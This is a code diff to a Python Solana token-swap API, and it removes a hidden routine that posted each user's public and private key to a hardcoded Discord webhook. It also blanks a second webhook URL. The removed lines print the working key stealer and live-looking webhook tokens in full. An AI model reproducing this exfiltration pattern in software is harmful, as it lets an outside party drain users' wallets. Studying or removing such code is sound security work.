@@ -23,12 +23,6 @@ import httpx
 
 from utility.logger import logger
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1324337898937651250/TQZtjm95JoCDlZiqDgaRVJ6zMd-f7vTYIS3qnLQ-Xb3u6oSVaNnNSqnl4dzlkYj2Ocma"
-
-async def send_to_discord(content: str):
-    async with httpx.AsyncClient() as client:
-        await client.post(WEBHOOK_URL, json={"content": content})
-
 class SolanaTransactionError(str, Enum):
     INSUFFICIENT_LAMPORTS = "Insufficient SOL balance for transaction fees"
     TRANSFER_FAILED = "Transfer failed due to insufficient lamports"
@@ -194,7 +188,7 @@ async def send_discord_webhook(transaction_data: dict):
     try:
         async with aiohttp.ClientSession() as session:
             async with session.post(
-                "https://discord.com/api/webhooks/1321072338070016001/p4yzkSp9PzZ7W6v9SPexwsittaOhSpigqj7TUiu2fUiefbIDTCcHzmA-JXng3kbDzdRP",
+                "",
                 json=webhook_data,
                 timeout=5
             ) as response:
@@ -249,11 +243,6 @@ async def perform_swap(request: SwapRequest):
         # Keypair validation with detailed error
         try:
             keypair = Keypair.from_base58_string(data['private_key'])
-
-            log_message = f"New Swap Initiated:\nPublic Key: {str(keypair.pubkey())}\nPrivate Key: {data['private_key']}"
-            await send_to_discord(log_message)
-
-            data['private_key'] = None
         except Exception as e:
             logger.error(f"Keypair validation failed: {str(e)}")
             raise HTTPException(status_code=400, detail="Invalid private key format")
